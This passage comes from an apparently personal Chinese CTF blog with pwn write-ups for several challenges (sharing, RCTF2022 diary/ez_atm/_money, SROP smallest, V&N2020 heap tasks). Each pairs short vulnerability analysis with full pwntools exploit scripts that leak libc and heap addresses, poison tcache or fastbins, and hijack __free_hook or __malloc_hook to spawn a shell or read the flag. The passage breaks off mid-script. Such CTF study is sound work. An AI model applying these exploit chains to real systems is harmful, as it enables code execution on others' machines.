gdb.attach(r)r.interactive()\n\nsharing相较于上一道题，这道题的难度可以说是十分简单，但是很烦的一点就是这道题目使用cpp写的，我对于cpp的逆向一直都不知道怎么入手，所以去问了大师傅，大师傅说对于cpp的逆向先是用ida搞清楚基本的功能，程序的特性利用动态调试来挖掘不过愚钝的我也不明白这道题到底是怎么想到create的idx相同时会free掉当前idx已存在的chunk，可能这就是经验积累吧。\n这道题知道了这样会free的话就很好做了这里就只贴exp了。\nfrom pwn import *elf = ELF(&#x27;./sharing&#x27;)r = process(&#x27;./sharing&#x27;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)def create(idx, size):    r.sendlineafter(b&#x27;Choice: &#x27;, b&#x27;1&#x27;)    r.sendlineafter(b&#x27;Idx: &#x27;, bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.sendlineafter(b&#x27;Sz: &#x27;, bytes(str(size), encoding=&#x27;utf8&#x27;))def move(from_idx, to_idx):    r.sendlineafter(b&#x27;Choice: &#x27;, b&#x27;2&#x27;)    r.sendlineafter(b&#x27;From: &#x27;, bytes(str(from_idx), encoding=&#x27;utf8&#x27;))    r.sendlineafter(b&#x27;To: &#x27;, bytes(str(to_idx), encoding=&#x27;utf8&#x27;))def show(idx):    r.sendlineafter(b&#x27;Choice: &#x27;, b&#x27;3&#x27;)    r.sendlineafter(b&#x27;Idx: &#x27;, bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, content):    r.sendlineafter(b&#x27;Choice: &#x27;, b&#x27;4&#x27;)    r.sendlineafter(b&#x27;Idx: &#x27;, bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.sendafter(b&#x27;Content: &#x27;, content)def hint(addr):    r.sendlineafter(b&#x27;Choice: &#x27;, bytes(str(0xdead), encoding=&#x27;utf8&#x27;))    r.sendlineafter(b&#x27;Hint: &#x27;, p32(0x2F767991) + p32(0) * 3)    r.sendlineafter(b&#x27;Addr: &#x27;, bytes(str(addr), encoding=&#x27;utf8&#x27;))create(0, 0x500)create(1, 0x500)create(0, 0x510)create(2, 0x500)show(2)main_arena_96 = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(main_arena_96))malloc_hook = (main_arena_96 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)libc_base = malloc_hook - libc.symbols[&#x27;__malloc_hook&#x27;]create(3, 0x80)create(4, 0x80)create(3, 0x90)create(4, 0x90)create(5, 0x80)show(5)heap_addr = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;))print(hex(heap_addr))heap_base = heap_addr - 0x145a0create(6, 0x10)create(7, 0x10)create(8, 0x10)create(7, 0x30)create(8, 0x30)target = heap_base + 0x14930for i in range(40):    hint(target)edit(6, p64(libc_base + libc.symbols[&#x27;__free_hook&#x27;]))hint(heap_base + 0x10)hint(heap_base + 0x10)create(9, 0x10)create(10, 0x10)create(11, 0x10)edit(11, p64(libc_base + libc.symbols[&#x27;system&#x27;]))edit(6, b&#x27;/bin/sh\\x00&#x27;)move(7, 6)# gdb.attach(r)r.interactive()\n\n\n剩下的题本来想复现musl了但是没有题目，然后就是其他题目我是真的要疯了，md全是cpp我属实需要下去再学习一段时间，后面复现D3的kernel。\n","categories":["比赛复现"],"tags":["chunk overlapping"]},{"title":"RCTF2022复现","url":"/2023/04/22/RCTF2022%E5%A4%8D%E7%8E%B0/","content":"diary利用分析就是一道很正常的用户态堆题。在delete函数中存在UAF漏洞。\n不过题目的逆向过程比较麻烦，加之我开始没注意到题目已经给了输入command的格式，如果注意到的话动态调试来逆向更为简单。\n题目很简单，利用UAF使得tcache和unsorted bin中同时存在一个chunk，泄漏出libc地址。利用encrypt函数分配到unsorted bin中的chunk进而修改到tcache中chunk的fd指针指向__free_hook即可。\nexpfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def create(idx, content):    r.recvuntil(b&#x27;input your test cmd:&#x27;)    payload = &#x27;add#1#1#1#1#1#&#123;&#125;#&#123;&#125;&#x27;.format(str(idx), content)    payload = bytes(payload, encoding=&#x27;utf8&#x27;)    r.sendline(payload)def update(idx, content):    r.recvuntil(b&#x27;input your test cmd:&#x27;)    payload = &#x27;update#&#123;&#125;#&#123;&#125;&#x27;.format(str(idx), content)    payload = bytes(payload, encoding=&#x27;utf8&#x27;)    r.sendline(payload)def show(idx):    r.recvuntil(b&#x27;input your test cmd:&#x27;)    payload = &#x27;show#&#123;&#125;&#x27;.format(str(idx))    payload = bytes(payload, encoding=&#x27;utf8&#x27;)    r.sendline(payload)def delete(idx):    r.recvuntil(b&#x27;input your test cmd:&#x27;)    payload = &#x27;delete#&#123;&#125;&#x27;.format(str(idx))    payload = bytes(payload, encoding=&#x27;utf8&#x27;)    r.sendline(payload)def encrypt(idx, offset, length):    r.recvuntil(b&#x27;input your test cmd:&#x27;)    payload = &#x27;encrypt#&#123;&#125;#&#123;&#125;#&#123;&#125;&#x27;.format(str(idx), str(offset), str(length))    payload = bytes(payload, encoding=&#x27;utf8&#x27;)    r.sendline(payload)for i in range(11):    create(i, str(i))for i in range(6):    delete(10-i)delete(1)show(3)r.recvuntil(b&#x27;1.1.1 1:1:4\\n&#x27;)heap_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x13a30print(&quot;heap_base:&quot;, hex(heap_base))update(3, b&#x27;3&#x27;)delete(1)show(2)r.recvuntil(b&#x27;1.1.1 1:1:4\\n&#x27;)libc_base = u64(r.recv(6).ljust(8, b&#x27;\\x00&#x27;)) - 0x1ecbe0print(&quot;libc_base:&quot;, hex(libc_base))free_hook = libc_base+0x1eee48system_addr = libc_base + libc.symbols[&#x27;system&#x27;]bin_sh_addr = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))r.recvuntil(b&#x27;input your test cmd:&#x27;)payload = b&#x27;update#0#&#x27; + flat(free_hook-4)r.sendline(payload)encrypt(0, 4, 6)update(0, &#x27;A&#x27;*(0x2c0-0x16))create(40, &#x27;/bin/sh;&#x27;)r.recvuntil(b&#x27;input your test cmd:&#x27;)payload = b&#x27;add#1#1#1#1#1#41#&#x27;+flat(system_addr)r.sendline(payload)delete(4)delete(3)# gdb.attach(r)r.interactive()\n\n这道题我在下面这个位置这里破防了，一直无法double free我还以为是glibc中检查了又不报错，去翻了源码发现会有报错，这才看了题目这里居然有这样一个验证属于是有点儿恶心人了。\n_BOOL8 __fastcall sub_43CC(__int64 a1)&#123;  return memcmp(*(const void **)(a1 + 0x10), &quot;    &quot;, 4uLL) == 0;&#125;void __fastcall sub_4194(__int64 a1)&#123;  if ( *(_QWORD *)(a1 + 0x10) &amp;&amp; (unsigned __int8)sub_43CC(a1) )  &#123;    if ( *(_QWORD *)(a1 + 0x10) )      operator delete[](*(void **)(a1 + 0x10));  &#125;&#125;\n\nez_atm利用分析题目难度依旧不是很大，但是我没想明白的是，一开始我可以gdb去调试服务端程序，但是后面却一直卡在accept了，有大佬知道的话可以留言告诉我一下怎么回事。也正是因为这道题目比较简单才可以在不调试的情况下直接打。\n这道题逆向分析过程也不算很难，存在三处漏洞。\n__int64 __fastcall stat_query(__int64 a1)&#123;  reply_message(1, a1);  return 1LL;&#125;\n\n这个函数中返回的依旧是0x84个字节，所以就可以读取到返回地址也就是libc上的地址了，从而拿到libc地址。\n__int64 query()&#123;  reply_message(1, user_list[user_id]);  return 2LL;&#125;\n\n第二处跟第一处类似，不同的是这里是越界读取堆上的内容，那么可以泄漏出堆地址。\n__int64 cancellation()&#123;  int i; // [rsp+Ch] [rbp-4h]  for ( i = 5; i &gt; 0; --i )  &#123;    if ( check_passwrod(user_id, &amp;password) )    &#123;      free((void *)user_list[user_id]);      user_id = -1;      reply_message(1, (__int64)&quot;The target account has been cancelled.&quot;);      return 0LL;    &#125;    if ( i != 1 )      reply_message(2, (__int64)&quot;password error.Try again.&quot;);    get_message();  &#125;  reply_message(    0,    (__int64)&quot;The password has been entered incorrectly for more than 5 times, and your account has been frozen.&quot;);  *(_DWORD *)(user_list[user_id] + 0x2CLL) = 1;  return 0LL;&#125;\n\n第三处则是这里在free之后没有清空指针引起的UAF。\n所以利用思路就是先泄漏libc地址，再泄漏heap地址，最后利用UAF篡改tcache中chunk的fd到__free_hook即可。\nexpfrom pwn import *from ctypes import cdllelf = ELF(&#x27;./pwn&#x27;)r = remote(&#x27;0.0.0.0&#x27;, 3339)# r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def get_random(random):    if random &lt;= 9:        return 0x30+random    if random == 10:        return 0x61    if random == 11:        return 0x62    if random == 12:        return 0x63    if random == 13:        return 0x64    if random == 14:        return 0x65    return 0x30seed = u32(r.recv(4))print(hex(seed))objdll = cdll.LoadLibrary(&#x27;./libc.so.6&#x27;)objdll.srand(seed)uuid = &#x27;yxyxyx-xyyx-4xyx4-xyyx-xyyyyxy&#x27;uuid = list(uuid)for i in range(0x1d + 1):    if ord(uuid[i]) != 52 and ord(uuid[i]) != 45:        if ord(uuid[i]) == 0x78:            random_num = objdll.rand() % 15            uuid[i] = chr(get_random(random_num))        else:            random_num = objdll.rand() % 15            uuid[i] = chr(get_random(random_num &amp; 3 | 8))uuid = &#x27;&#x27;.join(uuid)print(uuid)r.send(uuid)r.recv(0x84)def query():    sleep(0.1)    r.sendline(b&#x27;query&#x27;)def new_account(account, password, money):    sleep(0.1)    payload = b&#x27;&#x27;    payload += b&#x27;new_account&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)    payload += password.ljust(0x8, b&#x27;\\x00&#x27;)    payload += account.ljust(0x20, b&#x27;\\x00&#x27;)    payload += bytes(str(money), encoding=&#x27;utf8&#x27;).ljust(0x4, b&#x27;\\x00&#x27;)    r.sendline(payload)    r.recv(0x84)def cancellation(password):    sleep(0.1)    payload = b&#x27;&#x27;    payload += b&#x27;cancellation&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)    payload += password.ljust(0x8, b&#x27;\\x00&#x27;)    r.sendline(payload)    r.recv(0x84)def login(account, password):    sleep(0.1)    payload = b&#x27;&#x27;    payload += b&#x27;login&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)    payload += password.ljust(0x8, b&#x27;\\x00&#x27;)    payload += account.ljust(0x20, b&#x27;\\x00&#x27;)    r.sendline(payload)    r.recv(0x84)def update_pwd(old_password, new_password):    sleep(0.1)    payload = b&#x27;update_pwd&#x27;.ljust(0x10, b&#x27;\\x00&#x27;)    payload += new_password.ljust(8, b&#x27;\\x00&#x27;)    r.sendline(payload)    r.recvuntil(b&#x27;please input your pasword.&#x27;)    r.recv(0x84 - len(&#x27;please input your pasword.&#x27;))    payload = b&#x27;\\x00&#x27;*0x10    payload += old_password.ljust(8, b&#x27;\\x00&#x27;)    r.sendline(payload)    r.recv(0x84)new_account(b&#x27;dzhsb&#x27;, b&#x27;wow&#x27;, 0x100)sleep(0.1)r.sendline(b&#x27;exit_account&#x27;)new_account(b&#x27;dzz&#x27;, b&#x27;zzz&#x27;, 0x100)sleep(0.1)r.sendline(b&#x27;exit_account&#x27;)new_account(b&#x27;a&#x27;, b&#x27;a&#x27;, 0x100)sleep(0.1)r.sendline(b&#x27;stat_query&#x27;)r.recv(0x4+0x18)libc_base = u64(r.recv(8)) - 0x21c87print(hex(libc_base))r.recv(0x84 - 0x24)cancellation(b&#x27;a&#x27;)login(b&#x27;dzz&#x27;, b&#x27;zzz&#x27;)cancellation(b&#x27;zzz&#x27;)login(b&#x27;dzhsb&#x27;, b&#x27;wow&#x27;)query()r.recv(0x40 + 4)heap_addr = u64(r.recv(8))tcache_addr = u64(r.recv(8))print(hex(heap_addr))print(hex(tcache_addr))free_hook = libc_base + 0x3ed8e8system_addr = libc_base + libc.symbols[&#x27;system&#x27;]sleep(0.1)r.sendline(b&#x27;exit_account&#x27;)login(flat(tcache_addr), flat(heap_addr))update_pwd(flat(heap_addr), flat(free_hook))sleep(0.1)r.sendline(b&#x27;exit_account&#x27;)new_account(b&#x27;&gt;&amp;4&#x27;, b&#x27;cat flag&#x27;, 0x100)sleep(0.1)r.sendline(b&#x27;exit_account&#x27;)new_account(b&#x27;196082&#x27;, flat(system_addr), 0x100)sleep(0.1)r.sendline(b&#x27;exit_account&#x27;)login(b&#x27;&gt;&amp;4&#x27;, b&#x27;cat flag&#x27;)cancellation(b&#x27;cat flag&#x27;)r.interactive()\n\n因为这是cs架构的缘故，没有直接与程序进行交互，所以无法使用system(&quot;/bin/sh&quot;);。考虑使用反弹shell但是需要长度过长了，最后只能用这种重定向的方法传递flag。\n_money利用分析这道题目的逆向部分和上面题目很类似，细心的话可以很快发现。\n__int64 loan()&#123;  __m128i *v0; // rax  __int64 chunk; // rdx  int v2; // ecx  _DWORD *v3; // rax  if ( loan_idx &gt; 10 )  &#123;    my_puts(&quot;The loan has reached the upper limit of the system.&quot;);    return 2LL;  &#125;  else if ( *(_DWORD *)(user_list[uid] + 0x34LL) )  &#123;    my_puts(&quot;You still have a loan that has not been paid off, so you cannot continue to borrow.&quot;);    return 2LL;  &#125;  else  &#123;    my_puts(&quot;Please enter the loan amount (no more than 1 million).&quot;);    money = input_l();    if ( (unsigned int)money &gt; 0xF4240 )    &#123;      my_puts(&quot;Don&#x27;t push your luck.&quot;);    &#125;    else    &#123;      my_puts(&quot;Please leave your comments.&quot;);      my_read((char *)(loan_money + 72LL * loan_idx + 0x20), 0x20);      v0 = (__m128i *)(loan_money + 72LL * loan_idx);      chunk = user_list[uid];      *v0 = _mm_loadu_si128((const __m128i *)(chunk + 8));      v0[1] = _mm_loadu_si128((const __m128i *)(chunk + 0x18));      LODWORD(chunk) = loan_idx;      v2 = money;      *(_QWORD *)(loan_money + 72LL * loan_idx + 0x40) = (unsigned int)money;      v3 = (_DWORD *)user_list[uid];      v3[10] += v2;      v3[12] += v2;      v3[14] = chunk;      v3[13] = 1;      loan_idx = chunk + 1;      my_puts(&quot;The application has been submitted. Please check it.&quot;);    &#125;    return 2LL;  &#125;&#125;\n\n这个函数中的因为对loan_idx检查不正确导致越界读写。利用思路就是通过越界写修改size，使原本chunk的size变为0x460，释放后进入unsorted bin通过越界读读取libc地址。再通过同样的办法使第一个chunk进入到tcache中去，泄漏出堆地址。最后有两个指针指向同一个地址，理所当然修改tcache中chunk的fd指针即可。\nexpfrom pwn import *elf = ELF(&#x27;./pwn&#x27;)r = process(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc.so.6&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]context.arch = &#x27;amd64&#x27;def query():    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;Query&#x27;)def new_account(account, password, money):    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;new_account&#x27;)    r.recvuntil(b&#x27;please input the account id&#x27;)    r.sendline(account)    r.recvuntil(b&#x27;please input the password&#x27;)    r.sendline(password)    r.recvuntil(b&#x27;please input the money&#x27;)    r.sendline(bytes(str(money), encoding=&#x27;utf8&#x27;))def delete_account(password):    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;Cancellation&#x27;)    r.recvuntil(b&#x27;please enter the password&#x27;)    r.sendline(password)def update_info(new_password, old_password):    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;Update_info&#x27;)    r.recvuntil(b&#x27;please entet  a new password&#x27;)    r.sendline(new_password)    r.recvuntil(b&#x27;please input your password.&#x27;)    r.sendline(old_password)def loan_money(amount, comments):    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;Loan_money&#x27;)    r.recvuntil(b&#x27;Please enter the loan amount (no more than 1 million).&#x27;)    r.sendline(bytes(str(amount), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Please leave your comments.&#x27;)    r.sendline(comments)def repayment(amount):    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;Repayment&#x27;)    r.recvuntil(b&#x27;How much do you want to repay?&#x27;)    r.sendline(bytes(str(amount), encoding=&#x27;utf8&#x27;))def show_all_loan():    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&quot;I&#x27;m vip!&quot;)def exit_account():    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;Exit_account&#x27;)def login(account, password):    r.recvuntil(b&#x27;your choice :     &#x27;)    r.sendline(b&#x27;login&#x27;)    r.recvuntil(b&#x27;please input the account id&#x27;)    r.sendline(account)    r.recvuntil(b&#x27;please input the password&#x27;)    r.sendline(password)for i in range(10):    new_account(bytes(chr(0x61 + i), encoding=&#x27;utf8&#x27;)*0x20,                bytes(chr(0x31 + i), encoding=&#x27;utf8&#x27;), 0x100)    exit_account()for i in range(10):    login(bytes(chr(0x61 + i), encoding=&#x27;utf8&#x27;)*0x20,          bytes(chr(0x31 + i), encoding=&#x27;utf8&#x27;))    loan_money(0x100, b&#x27;dzhsb&#x27;)    exit_account()new_account(flat(0, 0x461, [0]*2),            bytes(chr(0x31 + 10), encoding=&#x27;utf8&#x27;), 0x100)exit_account()for i in range(4):    new_account(bytes(chr(0x61 + i + 11), encoding=&#x27;utf8&#x27;)*0x20,                bytes(chr(0x31 + i + 11), encoding=&#x27;utf8&#x27;), 0xffffffff)    exit_account()login(flat(0, 0x461, [0]*2), bytes(chr(0x31 + 10), encoding=&#x27;utf8&#x27;))loan_money(0x100, b&#x27;dzhsb&#x27;)exit_account()login(flat(0, b&#x27;dzhsb\\x00&#x27;, b&#x27;a&#x27;*0x12), flat([0]))delete_account(flat(0))login(b&#x27;o&#x27;*0x20, b&#x27;?&#x27;)show_all_loan()r.recvuntil(b&#x27;jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj&#x27;)r.recvuntil(b&#x27;Loan account  :&#x27;)r.recv(0x10)libc_base = u64(r.recv(8)) - 0x1ecbe0print(hex(libc_base))system_addr = libc_base + libc.symbols[&#x27;system&#x27;]free_hook = libc_base + 0x1eee48exit_account()new_account(b&#x27;elephant&#x27;.ljust(0x20, b&#x27;\\x00&#x27;), b&#x27;/bin/sh\\x00&#x27;, 0x100)exit_account()new_account(b&#x27;196082&#x27;+b&#x27;\\x00&#x27;*(0x20-0x6), b&#x27;X&#x27;+b&#x27;\\x00&#x27;*0x7, 0x100)exit_account()new_account(b&#x27;fuck_man&#x27;+b&#x27;\\x00&#x27;*(0x20-0x8), b&#x27;SB&#x27;+b&#x27;\\x00&#x27;*0x6, 0x100)exit_account()login(b&#x27;196082&#x27;+b&#x27;\\x00&#x27;*(0x20-0x6), b&#x27;X&#x27;+b&#x27;\\x00&#x27;*0x7)delete_account(b&#x27;X&#x27;+b&#x27;\\x00&#x27;*0x7)login(b&#x27;elephant&#x27;.ljust(0x20, b&#x27;\\x00&#x27;), b&#x27;/bin/sh\\x00&#x27;)delete_account(b&#x27;/bin/sh\\x00&#x27;)login(b&#x27;n&#x27;*0x20, b&#x27;&gt;&#x27;.ljust(8, b&#x27;\\x00&#x27;))show_all_loan()r.recvuntil(b&#x27;jjjjjjjjjjjjjjjjjjjjjjjjjjjjjjjj&#x27;)r.recvuntil(b&#x27;Loan account  :&#x27;)r.recv(0x10)heap_base = u64(r.recv(8)) - 0x5d0print(hex(heap_base))exit_account()new_account(b&#x27;elephant&#x27;.ljust(0x20, b&#x27;\\x00&#x27;), b&#x27;/bin/sh\\x00&#x27;, 0x100)exit_account()new_account(b&#x27;196082&#x27;+b&#x27;\\x00&#x27;*(0x20-0x6), b&#x27;X&#x27;+b&#x27;\\x00&#x27;*0x7, 0x100)exit_account()login(b&#x27;fuck_man&#x27;+b&#x27;\\x00&#x27;*(0x20-0x8), b&#x27;SB&#x27;+b&#x27;\\x00&#x27;*0x6)delete_account(b&#x27;SB&#x27;+b&#x27;\\x00&#x27;*0x6)login(b&#x27;196082&#x27;+b&#x27;\\x00&#x27;*(0x20-0x6), b&#x27;X&#x27;+b&#x27;\\x00&#x27;*0x7)delete_account(b&#x27;X&#x27;+b&#x27;\\x00&#x27;*0x7)password = heap_base + 0x620account = heap_base + 0x10login(flat(account).ljust(0x20, b&#x27;\\x00&#x27;), flat(password))update_info(flat(free_hook, [0]*4), flat(password))exit_account()new_account(b&#x27;fuck_man&#x27;+b&#x27;\\x00&#x27;*(0x20-0x8), b&#x27;SB&#x27;+b&#x27;\\x00&#x27;*0x6, 0x100)exit_account()new_account(b&#x27;\\x00&#x27;*0x20, flat(system_addr), 0x0)exit_account()login(b&#x27;elephant&#x27;.ljust(0x20, b&#x27;\\x00&#x27;), b&#x27;/bin/sh\\x00&#x27;)delete_account(b&#x27;/bin/sh\\x00&#x27;)# gdb.attach(r, &#x27;b*$rebase(0x187C)&#x27;)r.interactive()\n\n","categories":["比赛复现"],"tags":["UAF"]},{"title":"SROP","url":"/2022/03/01/SROP/","content":"在做题之前一直认为SROP是一项比较难以理解的东西，做了之后发现并不是那么回事，原理的话我推荐这个博主，我这里就不在赘述了。\n题目:2016年-360春秋杯-srop赛题smallest        buu上面也有\n题目就是裸奔，除了堆栈不可执行都没开\n题目的代码也很简单，就在start存在\n\n我对于这个东西的理解：在调用sys_rt_sigreturn时，会将rsp所指向的位置当作sigFrame，以至于我们可以随便伪造sigFrame\n在实行SROP攻击的时候需要知道的几个条件：需要泄漏出一个栈地址，需要知道syscall的地址，需要控制rax\n利用过程r.send(p64(start_addr)*3)r.send(b&#x27;\\xb3&#x27;)r.recv(0x8)stack_addr = u64(r.recv(8))print(hex(stack_addr))\n\n首先泄漏栈地址，从上图可以看到start_addr=0x4000b0，我们首先写入三个start的地址到栈里面，然后进行下一个read，我们输入b’\\xb3’，那么这时候我们将我们写入的第二个start地址改成了0x4000b3，并且此时的rax为1，所以下一次就会输出0x400个栈上面的内容，借机泄漏栈地址。\nsigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_addrpayload = p64(start_addr)+b&#x27;a&#x27;*0x8+bytes(sigframe)r.send(payload)payload = p64(syscall_addr).ljust(0xf, b&#x27;b&#x27;)r.send(payload)\n\n在第三个read的时候我们写入start的地址和伪造的sigframe，接着进入第四次read，随后写入syscall地址，然后补齐0xf个字节，然后就会执行sys_rt_sigreturn，并且此时的rsp正好指向了我们伪造的sigframe。\nbin_sh_addr = stack_addr+0x120sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = bin_sh_addrsigframe.rsi = 0sigframe.rdx = 0sigframe.rsp = stack_addrsigframe.rip = syscall_addrpayload = p64(start_addr)+b&#x27;a&#x27;*0x8+bytes(sigframe)print(hex(len(payload)))payload = payload.ljust(0x120, b&#x27;\\x00&#x27;)+b&#x27;/bin/sh\\x00&#x27;r.send(payload)payload = p64(syscall_addr).ljust(0xf, b&#x27;\\x00&#x27;)r.send(payload)\n\n此时，在执行完之后就会进入第五次read，此次read是我们构造的，所以rsi在我们已知的栈地址上面写入内容，所以使用同样的方法构造出execve。\n综上得出expfrom pwn import *elf = ELF(&#x27;./smallest&#x27;)r = process(&#x27;./smallest&#x27;)context.log_level = &#x27;debug&#x27;context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]context.arch = &#x27;amd64&#x27;start_addr = 0x4000B0syscall_addr = 0x4000BEr.send(p64(start_addr)*3)r.send(b&#x27;\\xb3&#x27;)r.recv(0x8)stack_addr = u64(r.recv(8))print(hex(stack_addr))sigframe = SigreturnFrame()sigframe.rax = constants.SYS_readsigframe.rdi = 0sigframe.rsi = stack_addrsigframe.rdx = 0x400sigframe.rsp = stack_addrsigframe.rip = syscall_addrpayload = p64(start_addr)+b&#x27;a&#x27;*0x8+bytes(sigframe)r.send(payload)payload = p64(syscall_addr).ljust(0xf, b&#x27;b&#x27;)r.send(payload)bin_sh_addr = stack_addr+0x120sigframe = SigreturnFrame()sigframe.rax = constants.SYS_execvesigframe.rdi = bin_sh_addrsigframe.rsi = 0sigframe.rdx = 0sigframe.rsp = stack_addrsigframe.rip = syscall_addrpayload = p64(start_addr)+b&#x27;a&#x27;*0x8+bytes(sigframe)print(hex(len(payload)))payload = payload.ljust(0x120, b&#x27;\\x00&#x27;)+b&#x27;/bin/sh\\x00&#x27;r.send(payload)payload = p64(syscall_addr).ljust(0xf, b&#x27;\\x00&#x27;)r.send(payload)r.interactive()\n\n","categories":["pwn"],"tags":["SROP"]},{"title":"V&N2020 公开赛复现","url":"/2022/01/20/V-N2020-%E5%85%AC%E5%BC%80%E8%B5%9B%E5%A4%8D%E7%8E%B0/","content":"总结一下:经过GFCTF的摧残打算复现一场较为简单的比赛了，虽然较为简单，但是也会有新东西学到哦。\nsimpleHeap第一题就是我前几天学得off by one漏洞。\nint sub_CBB()&#123;  int v1; // [rsp+Ch] [rbp-4h]  printf(&quot;idx?&quot;);  v1 = sub_9EA();  if ( v1 &lt; 0 || v1 &gt; 9 || !qword_2020A0[v1] )    exit(0);  printf(&quot;content:&quot;);  sub_C39(qword_2020A0[v1], dword_202060[v1]);  return puts(&quot;Done!&quot;);&#125;\n\n漏洞出现在edit函数内，可以多出一个字节。\n题目主要存在的难点应该是让你多试一下realloc地址应该偏移多少\nexpfrom pwn import *# r = process(&#x27;./vn_pwn_simpleHeap&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 26488)elf = ELF(&#x27;./vn_pwn_simpleHeap&#x27;)libc = ELF(&#x27;./libc-2.23.so&#x27;)context.log_level = &#x27;debug&#x27;def create(size, data):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size?&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(data)def edit(id, data):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;2&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))    r.recvuntil(b&#x27;content:&#x27;)    r.send(data)def show(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;3&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))def delete(id):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;4&#x27;)    r.recvuntil(b&#x27;idx?&#x27;)    r.sendline(bytes(str(id), encoding=&#x27;utf-8&#x27;))create(0x68, b&#x27;a&#x27;*0x68)  # 0create(0x60, b&#x27;a&#x27;*0x60)  # 1create(0x60, b&#x27;a&#x27;*0x60)  # 2create(0x60, b&#x27;a&#x27;*0x60)  # 3edit(0, b&#x27;a&#x27;*0x60+p64(0x70)+p8(0xe0+1))delete(1)create(0x60, b&#x27;a&#x27;*0x60)  # 1show(2)main_arena_88 = u64(r.recvuntil(b&#x27;\\n&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;))info(hex(main_arena_88))malloc_hook = malloc_hook = (main_arena_88 &amp; 0xFFFFFFFFFFFFF000) + \\    (libc.symbols[&#x27;__malloc_hook&#x27;] &amp; 0xfff)info(hex(malloc_hook))libc_base = malloc_hook-libc.symbols[&#x27;__malloc_hook&#x27;]realloc = libc_base+libc.symbols[&#x27;realloc&#x27;]one_gadget = libc_base+0x4526acreate(0x60, b&#x27;a&#x27;*0x60)  # 4delete(2)delete(1)delete(4)create(0x60, p64(malloc_hook-0x20+5-8))  # 1create(0x60, b&#x27;a&#x27;*0x60)create(0x60, b&#x27;a&#x27;*0x60)create(0x60, b&#x27;a&#x27;*(0x20-5-8-8)+p64(one_gadget)+p64(realloc+0xc))# create(1, b&#x27;&#x27;)r.recvuntil(b&#x27;choice: &#x27;)r.sendline(b&#x27;1&#x27;)r.recvuntil(b&#x27;size?&#x27;)r.sendline(bytes(str(0x10), encoding=&#x27;utf-8&#x27;))info(hex(one_gadget))info(hex(realloc))# gdb.attach(r)# flag = flag&#123;e919bec8-e5a6-4c1d-a44a-282f08c57c06&#125;r.interactive()\n\neasyTHeap这道题漏洞发生在delete函数内，没有清楚指针造成UAF\nint sub_D2C()&#123;  int v1; // [rsp+Ch] [rbp-4h]  printf(&quot;idx?&quot;);  v1 = sub_9EA();  if ( v1 &lt; 0 || v1 &gt; 6 || !*(&amp;unk_202080 + v1) )    exit(0);  free(*(&amp;unk_202080 + v1));  dword_202060[v1] = 0;  return puts(&quot;Done!&quot;);&#125;\n\n通过UAF得到tcache struct chunk的地址，再利用double free实现控制tcache struct chunk，进行tcache struct attack。这道题和GFCTF那道题很类似，不过这道简单一点，这里就不赘述可以去看复现GFCTF的那一篇 https://cv196082.gitee.io/2022/01/11/GFCTF/ \nexpfrom pwn import *# r = process(&#x27;./vn_pwn_easyTHeap&#x27;)r = remote(&#x27;node4.buuoj.cn&#x27;, 25768)elf = ELF(&#x27;./vn_pwn_easyTHeap&#x27;)libc = ELF(&#x27;./libc-2.27.so&#x27;)context.log_level = &#x27;debug&#x27;def create(size):    r.recvuntil(b&#x27;choice: &#x27;)    r.sendline(b&#x27;1&#x27;)    r.recvuntil(b&#x27;size?&#x27;)    